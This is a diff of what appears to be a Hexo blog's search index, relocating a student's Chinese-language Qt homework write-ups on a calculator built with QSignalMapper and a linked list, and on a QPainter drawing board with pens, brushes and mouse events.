class="line">    void set_solid_pattern();</span><br><span class="line">    void set_dense_pattern();</span><br><span class="line">    void set_none_pattern();</span><br></pre></td></tr></table></figure>
-<h4 id="槽函数定义示例："><a href="#槽函数定义示例：" class="headerlink" title="槽函数定义示例："></a>槽函数定义示例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::status_line()</span><br><span class="line">&#123;</span><br><span class="line">    status&#x3D;1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::change_color_red()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setColor(Qt::red);</span><br><span class="line">    &#x2F;&#x2F;注意书写格式，不可以写为pen.setColor(&quot;red&quot;);否则无法传入颜色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::penwidth5()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setWidth(5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_dash()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setStyle(Qt::DashLine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_fill_blue()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setColor(Qt::blue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_dense_pattern()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setStyle(Qt::Dense7Pattern);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_none_pattern()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setStyle(Qt::NoBrush);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="遇到的问题和解决方法"><a href="#遇到的问题和解决方法" class="headerlink" title="遇到的问题和解决方法"></a>遇到的问题和解决方法</h4><ul>
-<li>信号和槽函数无法连接：<ul>
-<li>检查信号和发送信号的来源是否对应</li>
-<li>检查信号和槽的拼写是否准确</li>
-<li>利用qDebug()进行调试</li>
-</ul>
-</li>
-<li>brush必须设置填充样式，否则无法填充</li>
-</ul>
-<hr>
-<h3 id="六、成果展示"><a href="#六、成果展示" class="headerlink" title="六、成果展示"></a>六、成果展示</h3><p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/v86upj0wwx905xyzftjgvh3j/image_1df8akslg1oo5li7b5jp314rb16.png"  alt="image_1df8akslg1oo5li7b5jp314rb16.png-79.6kB"></p>
-]]></content>
-      <categories>
-        <category>Qt</category>
-      </categories>
-      <tags>
-        <tag>Qt</tag>
-        <tag>大一</tag>
-        <tag>作业</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Qt作业一：计算器</title>
-    <url>/2019/08/31/Qt%E4%BD%9C%E4%B8%9A%E4%B8%80/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="ui界面对应的ui-h文件的作用："><a href="#ui界面对应的ui-h文件的作用：" class="headerlink" title="ui界面对应的ui_*.h文件的作用："></a>ui界面对应的ui_*.h文件的作用：</h2><p>ui_.h是ui界面的代码化表达，<br>即用非Qt软件打开ui文件时会显示ui_*.h文件，用代码描述ui界面内容</p>
-<hr>
-<h2 id="计算器程序："><a href="#计算器程序：" class="headerlink" title="计算器程序："></a>计算器程序：</h2><h3 id="1-通过Qt-designer设计界面："><a href="#1-通过Qt-designer设计界面：" class="headerlink" title="1.通过Qt designer设计界面："></a>1.通过Qt designer设计界面：</h3><p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/exg4t6ijsh7pnvnj0rpwgmm8/image_1deo6ig6qdpc1jdn1h1te6e1sk01m.png"  alt="image_1deo6ig6qdpc1jdn1h1te6e1sk01m.png-236.7kB"></p>
-<h4 id="出现的问题和解决方法："><a href="#出现的问题和解决方法：" class="headerlink" title="出现的问题和解决方法："></a>出现的问题和解决方法：</h4><ul>
-<li>窗口对象名（QWidget类）要和对窗口进行操作的父类类名一致，否则会提示“引用了不完整的类型”</li>
-<li>注意修改按钮名称以便下一步</li>
-</ul>
-<h3 id="2-使用QSignalMapper："><a href="#2-使用QSignalMapper：" class="headerlink" title="2.使用QSignalMapper："></a>2.使用QSignalMapper：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signalmapper&#x3D;new QSignalMapper (this);</span><br><span class="line">QObjectList list &#x3D;this-&gt;children();&#x2F;&#x2F;list为全部按钮</span><br><span class="line">foreach(QObject *oc,list)&#x2F;&#x2F;遍历list中的按钮</span><br><span class="line">&#123;</span><br><span class="line">    if(oc-&gt;objectName()!&#x3D;&quot;gridLayout&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;display&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;&quot;)&#x2F;&#x2F;排除不需要链接槽函数clicked()的多余按钮</span><br><span class="line">    &#123;</span><br><span class="line">        QPushButton *pushbutton&#x3D;qobject_cast&lt;QPushButton *&gt;(oc);&#x2F;&#x2F;利用qobject——cast进行类型转换</span><br><span class="line">        connect(pushbutton,SIGNAL(clicked()),signalmapper,SLOT(map()));&#x2F;&#x2F;将信号链接到signnalmapper上</span><br><span class="line">        signalmapper-&gt;setMapping(pushbutton,pushbutton-&gt;text());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">connect(signalmapper,SIGNAL(mapped(QString)),this,SLOT(clicked(QString)));&#x2F;&#x2F;将signalmapper连接至槽函数clicked（QString）上，即实现将所需按钮链接至一个槽函数</span><br></pre></td></tr></table></figure>
-
-<h4 id="出现的问题和解决方法：-1"><a href="#出现的问题和解决方法：-1" class="headerlink" title="出现的问题和解决方法："></a>出现的问题和解决方法：</h4><ul>
-<li>理解QSignalMapper的工作原理和方法：<br>  qsignalmapper:相当于一个信号转发器，将多个按钮信号连接到一个槽函数上（详见代码注释）<br>  引入QSignalMapper头文件<br>  还有一种获取按钮列表的方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QString buttontext &#x3D; &quot;btn1,btn2,btn3,btn4,btn5,btn6,btn7,btn8,btn9,btn10&quot;; </span><br><span class="line">QStringList texts &#x3D; buttontext.split(&quot;,&quot;);</span><br></pre></td></tr></table></figure>
-也可利用按钮名字的共性筛选出所需要的按钮：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(oc-&gt;nbjectName.starswith(&quot;***&quot;)</span><br></pre></td></tr></table></figure></li>
-<li>最初设计ui时将所有按钮放到了gridlayout下，结果到至按钮无法访问，将按钮挪出gridlayout，若需使按钮排列整齐，designer界面上方有辅助排列功能按键。</li>
-</ul>
-<p>###3.计算功能的实现：<br>头文件声明：</p>
-<ul>
-<li>node类</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    class node</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    node();</span><br><span class="line">    double data;&#x2F;&#x2F;字符串转成double后存储在data中</span><br><span class="line">    QString sign;&#x2F;&#x2F;如果时运算符节点，用sign记录运算符</span><br><span class="line">    QString nums;&#x2F;&#x2F;以字符串形式存储double类型的数据</span><br><span class="line">    node* next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>widget类：//计算器类</li>
-</ul>
-<p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/0rjzz44tj1tybvzvwublr5p9/image_1den8jsp2cvi120b1183p941e3tm.png"  alt="image_1den8jsp2cvi120b1183p941e3tm.png-194.6kB"></p>
-<ul>
-<li>将按钮上的内容输入到字符串中：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::clicked(QString ch)</span><br><span class="line">&#123;</span><br><span class="line">    if(ch&#x3D;&#x3D;&quot;sqrt&quot;)</span><br><span class="line">        opt.append(&quot;k&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;square&quot;)</span><br><span class="line">        opt.append(&quot;p&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;rev&quot;)</span><br><span class="line">        opt.append(&quot;d&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;neg&quot;)</span><br><span class="line">        opt.append(&quot;f&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;&#x3D;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        opt.append(&quot;&#x3D;\0&quot;);</span><br><span class="line">        cal();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        opt.append(ch);</span><br><span class="line">    &#125;</span><br><span class="line">    ui-&gt;display-&gt;setPlainText(opt);&#x2F;&#x2F;显示输入内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>将字符串转成链表<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/3bzdgoa177er00batvrsitu8/image_1den9fkk8r1mvuu2cn130g14c21g.png"  alt="image_1den9fkk8r1mvuu2cn130g14c21g.png-198kB"><ul>
-<li>QString 转 double：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t-&gt;data&#x3D;t-&gt;nums.toDouble;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>实现节点与节点的计算<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::calculate(node*a,node*b,node*c)</span><br><span class="line">&#123;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;+&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data + c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;-&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data - c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;*&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data * c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;&#x2F;&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data &#x2F; c-&gt;data;</span><br><span class="line">&#x2F;&#x2F;节点合并</span><br><span class="line">    if (tail !&#x3D; c)</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next&#x3D;c-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next&#x3D;nullptr;</span><br><span class="line">        tail&#x3D;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::  calculate(node*a,node*b)</span><br><span class="line">&#123;</span><br><span class="line">   if (b-&gt;sign &#x3D;&#x3D; &#39;k&#39;)</span><br><span class="line">        a-&gt;data &#x3D; sqrt(a-&gt;data);</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;p&#39;)</span><br><span class="line">        a-&gt;data *&#x3D; a-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;d&#39;)</span><br><span class="line">        a-&gt;data &#x3D; 1 &#x2F; a-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;f&#39;)</span><br><span class="line">        a-&gt;data &#x3D; -a-&gt;data;</span><br><span class="line">    if(b!&#x3D;tail)</span><br><span class="line">        a-&gt;next &#x3D; b-&gt;next;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next &#x3D; nullptr;</span><br><span class="line">        tail &#x3D; a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>计算样例<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/69dz89gzml1ewgor9s4az111/image_1deo6udbc13io132bduhi37lcs1c.png"  alt="image_1deo6udbc13io132bduhi37lcs1c.png-194.7kB"><br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/hzc5rc84go6osgaubhe4hpkk/image_1deo711q21576823lu110ue3l81p.png"  alt="image_1deo711q21576823lu110ue3l81p.png-198.2kB"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Qt</category>
-      </categories>
-      <tags>
-        <tag>Qt</tag>
-        <tag>大一</tag>
-        <tag>作业</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Qt大作业：影音播放器</title>
     <url>/2019/08/31/Qt%E5%A4%A7%E4%BD%9C%E4%B8%9A%E6%8A%A5%E5%91%8A/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="软件类别：本地视频文件播放器"><a href="#软件类别：本地视频文件播放器" class="headerlink" title="软件类别：本地视频文件播放器"></a>软件类别：本地视频文件播放器</h3><hr>
@@ -6069,6 +6545,100 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
         <tag>大一</tag>
         <tag>作业</tag>
         <tag>大作业</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Qt作业一：计算器</title>
+    <url>/2019/08/31/Qt%E4%BD%9C%E4%B8%9A%E4%B8%80/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="ui界面对应的ui-h文件的作用："><a href="#ui界面对应的ui-h文件的作用：" class="headerlink" title="ui界面对应的ui_*.h文件的作用："></a>ui界面对应的ui_*.h文件的作用：</h2><p>ui_.h是ui界面的代码化表达，<br>即用非Qt软件打开ui文件时会显示ui_*.h文件，用代码描述ui界面内容</p>
+<hr>
+<h2 id="计算器程序："><a href="#计算器程序：" class="headerlink" title="计算器程序："></a>计算器程序：</h2><h3 id="1-通过Qt-designer设计界面："><a href="#1-通过Qt-designer设计界面：" class="headerlink" title="1.通过Qt designer设计界面："></a>1.通过Qt designer设计界面：</h3><p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/exg4t6ijsh7pnvnj0rpwgmm8/image_1deo6ig6qdpc1jdn1h1te6e1sk01m.png"  alt="image_1deo6ig6qdpc1jdn1h1te6e1sk01m.png-236.7kB"></p>
+<h4 id="出现的问题和解决方法："><a href="#出现的问题和解决方法：" class="headerlink" title="出现的问题和解决方法："></a>出现的问题和解决方法：</h4><ul>
+<li>窗口对象名（QWidget类）要和对窗口进行操作的父类类名一致，否则会提示“引用了不完整的类型”</li>
+<li>注意修改按钮名称以便下一步</li>
+</ul>
+<h3 id="2-使用QSignalMapper："><a href="#2-使用QSignalMapper：" class="headerlink" title="2.使用QSignalMapper："></a>2.使用QSignalMapper：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signalmapper&#x3D;new QSignalMapper (this);</span><br><span class="line">QObjectList list &#x3D;this-&gt;children();&#x2F;&#x2F;list为全部按钮</span><br><span class="line">foreach(QObject *oc,list)&#x2F;&#x2F;遍历list中的按钮</span><br><span class="line">&#123;</span><br><span class="line">    if(oc-&gt;objectName()!&#x3D;&quot;gridLayout&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;display&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;&quot;)&#x2F;&#x2F;排除不需要链接槽函数clicked()的多余按钮</span><br><span class="line">    &#123;</span><br><span class="line">        QPushButton *pushbutton&#x3D;qobject_cast&lt;QPushButton *&gt;(oc);&#x2F;&#x2F;利用qobject——cast进行类型转换</span><br><span class="line">        connect(pushbutton,SIGNAL(clicked()),signalmapper,SLOT(map()));&#x2F;&#x2F;将信号链接到signnalmapper上</span><br><span class="line">        signalmapper-&gt;setMapping(pushbutton,pushbutton-&gt;text());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">connect(signalmapper,SIGNAL(mapped(QString)),this,SLOT(clicked(QString)));&#x2F;&#x2F;将signalmapper连接至槽函数clicked（QString）上，即实现将所需按钮链接至一个槽函数</span><br></pre></td></tr></table></figure>
+
+<h4 id="出现的问题和解决方法：-1"><a href="#出现的问题和解决方法：-1" class="headerlink" title="出现的问题和解决方法："></a>出现的问题和解决方法：</h4><ul>
+<li>理解QSignalMapper的工作原理和方法：<br>  qsignalmapper:相当于一个信号转发器，将多个按钮信号连接到一个槽函数上（详见代码注释）<br>  引入QSignalMapper头文件<br>  还有一种获取按钮列表的方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QString buttontext &#x3D; &quot;btn1,btn2,btn3,btn4,btn5,btn6,btn7,btn8,btn9,btn10&quot;; </span><br><span class="line">QStringList texts &#x3D; buttontext.split(&quot;,&quot;);</span><br></pre></td></tr></table></figure>
+也可利用按钮名字的共性筛选出所需要的按钮：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(oc-&gt;nbjectName.starswith(&quot;***&quot;)</span><br></pre></td></tr></table></figure></li>
+<li>最初设计ui时将所有按钮放到了gridlayout下，结果到至按钮无法访问，将按钮挪出gridlayout，若需使按钮排列整齐，designer界面上方有辅助排列功能按键。</li>
+</ul>
+<p>###3.计算功能的实现：<br>头文件声明：</p>
+<ul>
+<li>node类</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    class node</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    node();</span><br><span class="line">    double data;&#x2F;&#x2F;字符串转成double后存储在data中</span><br><span class="line">    QString sign;&#x2F;&#x2F;如果时运算符节点，用sign记录运算符</span><br><span class="line">    QString nums;&#x2F;&#x2F;以字符串形式存储double类型的数据</span><br><span class="line">    node* next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>widget类：//计算器类</li>
+</ul>
+<p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/0rjzz44tj1tybvzvwublr5p9/image_1den8jsp2cvi120b1183p941e3tm.png"  alt="image_1den8jsp2cvi120b1183p941e3tm.png-194.6kB"></p>
+<ul>
+<li>将按钮上的内容输入到字符串中：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::clicked(QString ch)</span><br><span class="line">&#123;</span><br><span class="line">    if(ch&#x3D;&#x3D;&quot;sqrt&quot;)</span><br><span class="line">        opt.append(&quot;k&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;square&quot;)</span><br><span class="line">        opt.append(&quot;p&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;rev&quot;)</span><br><span class="line">        opt.append(&quot;d&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;neg&quot;)</span><br><span class="line">        opt.append(&quot;f&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;&#x3D;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        opt.append(&quot;&#x3D;\0&quot;);</span><br><span class="line">        cal();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        opt.append(ch);</span><br><span class="line">    &#125;</span><br><span class="line">    ui-&gt;display-&gt;setPlainText(opt);&#x2F;&#x2F;显示输入内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>将字符串转成链表<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/3bzdgoa177er00batvrsitu8/image_1den9fkk8r1mvuu2cn130g14c21g.png"  alt="image_1den9fkk8r1mvuu2cn130g14c21g.png-198kB"><ul>
+<li>QString 转 double：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t-&gt;data&#x3D;t-&gt;nums.toDouble;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>实现节点与节点的计算<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::calculate(node*a,node*b,node*c)</span><br><span class="line">&#123;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;+&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data + c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;-&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data - c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;*&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data * c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;&#x2F;&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data &#x2F; c-&gt;data;</span><br><span class="line">&#x2F;&#x2F;节点合并</span><br><span class="line">    if (tail !&#x3D; c)</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next&#x3D;c-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next&#x3D;nullptr;</span><br><span class="line">        tail&#x3D;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::  calculate(node*a,node*b)</span><br><span class="line">&#123;</span><br><span class="line">   if (b-&gt;sign &#x3D;&#x3D; &#39;k&#39;)</span><br><span class="line">        a-&gt;data &#x3D; sqrt(a-&gt;data);</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;p&#39;)</span><br><span class="line">        a-&gt;data *&#x3D; a-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;d&#39;)</span><br><span class="line">        a-&gt;data &#x3D; 1 &#x2F; a-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;f&#39;)</span><br><span class="line">        a-&gt;data &#x3D; -a-&gt;data;</span><br><span class="line">    if(b!&#x3D;tail)</span><br><span class="line">        a-&gt;next &#x3D; b-&gt;next;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next &#x3D; nullptr;</span><br><span class="line">        tail &#x3D; a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>计算样例<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/69dz89gzml1ewgor9s4az111/image_1deo6udbc13io132bduhi37lcs1c.png"  alt="image_1deo6udbc13io132bduhi37lcs1c.png-194.7kB"><br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/hzc5rc84go6osgaubhe4hpkk/image_1deo711q21576823lu110ue3l81p.png"  alt="image_1deo711q21576823lu110ue3l81p.png-198.2kB"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Qt</category>
+      </categories>
+      <tags>
+        <tag>Qt</tag>
+        <tag>大一</tag>
+        <tag>作业</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Qt作业二：画图板</title>
+    <url>/2019/08/31/Qt%E4%BD%9C%E4%B8%9A%E4%BA%8C%E2%80%94%E2%80%94%E7%94%BB%E5%9B%BE%E6%9D%BF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="一、界面设计"><a href="#一、界面设计" class="headerlink" title="一、界面设计"></a>一、界面设计</h3><p>利用designer设计menubar和toolbar<br>遇到的问题和解决方法：<br>toolbar和menubar重叠，拖动toolbar部件至屏幕右侧即可。<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/d8i77lp27ad7u5mdfth4ivte/image_1df8880jt10m8g53v041efd6j29.png"  alt="image_1df8880jt10m8g53v041efd6j29.png-246.9kB"><br>menubar中可以添加子选项<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/mbukua86v9pv56obgta3og2o/image_1df88esf0le118bvdh91a0b130d9.png"  alt="image_1df88esf0le118bvdh91a0b130d9.png-256.2kB"></p>
+<hr>
+<h3 id="二、paint类属性"><a href="#二、paint类属性" class="headerlink" title="二、paint类属性"></a>二、paint类属性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QPixmap *pix;&#x2F;&#x2F;设置画图背景</span><br><span class="line">QPoint start;&#x2F;&#x2F;鼠标按下时的坐标</span><br><span class="line">QPoint end;&#x2F;&#x2F;鼠标抬起时的坐标</span><br><span class="line">int status;&#x2F;&#x2F;画图状态，1：直线，2：矩形，3：椭圆，4：自由绘图</span><br><span class="line">QPen pen;&#x2F;&#x2F;设置线条的属性</span><br><span class="line">QBrush brush;&#x2F;&#x2F;设置填充属性</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="三、paint类protected成员"><a href="#三、paint类protected成员" class="headerlink" title="三、paint类protected成员"></a>三、paint类protected成员</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected:</span><br><span class="line">    void mousePressEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标按下事件</span><br><span class="line">    void mouseMoveEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标移动事件</span><br><span class="line">    void mouseReleaseEvent(QMouseEvent *);&#x2F;&#x2F;鼠标释放事件</span><br><span class="line">    void paintEvent(QPaintEvent*);&#x2F;&#x2F;绘画事件</span><br></pre></td></tr></table></figure>
+<p>函数定义：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::mousePressEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    start&#x3D;event-&gt;pos();&#x2F;&#x2F;获得鼠标点击坐标</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint::mouseReleaseEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    end&#x3D;event-&gt;pos();</span><br><span class="line">    qDebug()&lt;&lt;start&lt;&lt;endl&lt;&lt;end&lt;&lt;endl;</span><br><span class="line">    QPainter *painter&#x3D;new QPainter(pix);</span><br><span class="line">    painter-&gt;setPen(pen);&#x2F;&#x2F;设置线条属性</span><br><span class="line">    painter-&gt;setBrush(brush);&#x2F;&#x2F;设置笔刷属性</span><br><span class="line">    switch (status) &#123;</span><br><span class="line">    case 1:&#x2F;&#x2F;画直线</span><br><span class="line">    &#123;</span><br><span class="line">        painter-&gt;drawLine(start,end);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    case 2:&#x2F;&#x2F;画矩形</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        int width&#x3D;end.x()-start.x();</span><br><span class="line">        int height&#x3D;end.y()-start.x();</span><br><span class="line">        painter-&gt;drawRect(start.x(),start.y(),width,height);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    case 3:&#x2F;&#x2F;画椭圆</span><br><span class="line">    &#123;</span><br><span class="line">        int width&#x3D;end.x()-start.x();</span><br><span class="line">        int height&#x3D;end.y()-start.x();</span><br><span class="line">        painter-&gt;drawEllipse(start.x(),start.y(),width,height);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    this-&gt;update();</span><br><span class="line">    delete painter;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint::paintEvent(QPaintEvent *)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  QPainter painter(this);</span><br><span class="line">  painter.drawPixmap(QPoint(0, 0), *pix);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint:: mouseMoveEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    if(status&#x3D;&#x3D;4)&#x2F;&#x2F;绘制鼠标移动轨迹</span><br><span class="line">    &#123;</span><br><span class="line">        QPainter* painter&#x3D;new QPainter(pix);</span><br><span class="line">        end&#x3D;event-&gt;pos();</span><br><span class="line">        painter-&gt;setPen(pen);</span><br><span class="line">        painter-&gt;drawLine(start,end);&#x2F;&#x2F;每一次移动画直线</span><br><span class="line">        this-&gt;update();</span><br><span class="line">        start&#x3D;end;&#x2F;&#x2F;下一次绘制的开始点是这次的结束点</span><br><span class="line">        delete painter;&#x2F;&#x2F;若无delete则只可以绘制一次</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="遇到的问题和解决方法："><a href="#遇到的问题和解决方法：" class="headerlink" title="遇到的问题和解决方法："></a>遇到的问题和解决方法：</h4><p>painter在完成每次绘制时需delete，否则无法进行下一次绘制</p>
+<hr>
